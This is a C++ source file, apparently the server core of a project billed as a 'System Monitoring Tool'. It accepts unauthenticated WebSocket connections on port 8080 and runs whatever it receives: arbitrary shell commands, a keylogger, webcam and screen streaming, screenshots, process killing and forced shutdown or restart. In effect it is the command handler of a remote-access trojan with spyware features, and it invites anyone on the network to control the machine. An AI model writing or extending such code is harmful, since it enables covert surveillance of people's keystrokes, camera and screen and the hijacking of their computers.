/*
 * cpp-websocket - System Monitoring Tool
 * Copyright (C) 2025 pnthuc and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "global.h"
#include "screenshot.h"
#include "keylogger.h"
#include "list_app.h"
#include "camera.h"
#include "restart.h"
#include "shutdown.h"
#include "screen.h"
#include "list_proc.h"
#include "terminal.h"
#include "announce.h"
#include "systeminfo.h"


void session(tcp::socket socket) {
    // SystemMonitor sysMonitor;
    auto sysMonitor = std::make_shared<SystemMonitor>();
    try {
        auto ws_ptr = std::make_shared<websocket::stream<tcp::socket>>(std::move(socket));
        ws_ptr->accept();
        sendMsg(*ws_ptr, "text", "PATH", std::filesystem::current_path().string());

        std::thread statsThread([ws_ptr, sysMonitor]() {
            try {
                while (true) { 
                    double cpu = sysMonitor->getCpuUsage();
                    auto ram = sysMonitor->getRamUsage();
                    std::string uptime = sysMonitor->getSystemUptime();

                    std::string jsonMsg = "{\"cpu\":" + std::to_string(cpu) + 
                                        ",\"ram_percent\":" + std::to_string(ram.percent) + 
                                        ",\"ram_used_gb\":" + std::to_string(ram.usedGB) + 
                                        ",\"ram_total_gb\":" + std::to_string(ram.totalGB) + 
                                        ",\"uptime\":\"" + uptime + "\"}";

                    sendMsg(*ws_ptr, "sysinfo", "SYS", jsonMsg);

                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            } catch (...) {}
        });
        statsThread.detach();

        for (;;) {
            beast::flat_buffer buffer;
            ws_ptr->read(buffer);
            std::string msg = beast::buffers_to_string(buffer.data());
            file_logger->info("Received: {}", msg);
            json data = json::parse(msg);
            if (data.contains("terminal")) {
                std::string command = data["terminal"];
                std::string path = data["path"];
                executeCommand(command, path, *ws_ptr);
                continue;
            }
            if (data["command"] == "screenshot") {
                sendMsg(*ws_ptr, "text", "Info", "Capturing screenshot...");
                captureScreenshot(*ws_ptr);
            }
            else if (data["command"] == "processes") {
                sendMsg(*ws_ptr, "text", "Info", "Listing running processes...");
                list_processes(*ws_ptr);
            }
            else if (data["command"] == "applications") {
                sendMsg(*ws_ptr, "text", "Info", "Listing running applications...");
                list_applications(*ws_ptr);
            }
            else if (data["command"] == "start_keylogger") {
                sendMsg(*ws_ptr, "text", "Info", "Keylogger started.");
                key_log_start(ws_ptr);  
            }
            else if (data["command"] == "stop_keylogger") {
                key_log_stop();
                sendMsg(*ws_ptr, "text", "Info", "Keylogger stopped.");
            }
            else if (data["command"] == "shutdown") {
                sendMsg(*ws_ptr, "text", "Info", "Shutting down the system...");
                system("shutdown /s /t 0 /f");
            }
            else if (data["command"] == "restart") {
                sendMsg(*ws_ptr, "text", "Info", "Restarting the system...");
                system("shutdown /r /t 0 /f");
            }
            else if (data["command"] == "start_camera") {
                sendMsg(*ws_ptr, "text", "Info", "Camera started.");
                startCamera(ws_ptr);
                sendMsg(*ws_ptr, "text", "Info", "Showing video...");
            }
            else if (data["command"] == "stop_camera") {
                stopCamera();
                sendMsg(*ws_ptr, "text", "Info", "Camera stopped.");
            }
            else if (data["command"] == "start_screen") {
                sendMsg(*ws_ptr, "text", "Info", "Screen recording started.");
                startScreen(ws_ptr);
                sendMsg(*ws_ptr, "text", "Info", "Recording screen...");
            }
            else if (data["command"] == "stop_screen") {
                sendMsg(*ws_ptr, "text", "Info", "Screen recording stopped.");
                stopScreen();
            }
            else if (data["command"] == "stop_process") {
                handle_kill_process(data, *ws_ptr);
            }
            else {
                sendMsg(*ws_ptr, "text", "Info", "Unknown command: " + msg);
            }
        }
    }
    catch (std::exception& e) {
        file_logger->error("Session error: {}", e.what());
        key_log_stop();
        stopCamera();
        stopScreen();
    } catch (...) {
        file_logger->error("Session unknown error");
        key_log_stop();
        stopCamera();
        stopScreen();
    }
}

int main() {
    try {
        net::io_context ioc;
        tcp::acceptor acceptor(ioc, {tcp::v4(), 8080});
        spdlog::flush_on(spdlog::level::info);
        file_logger->info("Server running at ws://localhost:8080");
        std::thread(announce_once).detach();

        for (;;) {
            tcp::socket socket(ioc);
            acceptor.accept(socket);
            std::thread([s = std::move(socket)]() mutable {
                session(std::move(s));
            }).detach();
        }

    } catch (std::exception& e) {
        file_logger->error("Error: {}", e.what());
        std::cerr << "Error: " << e.what() << std::endl;
    }
}
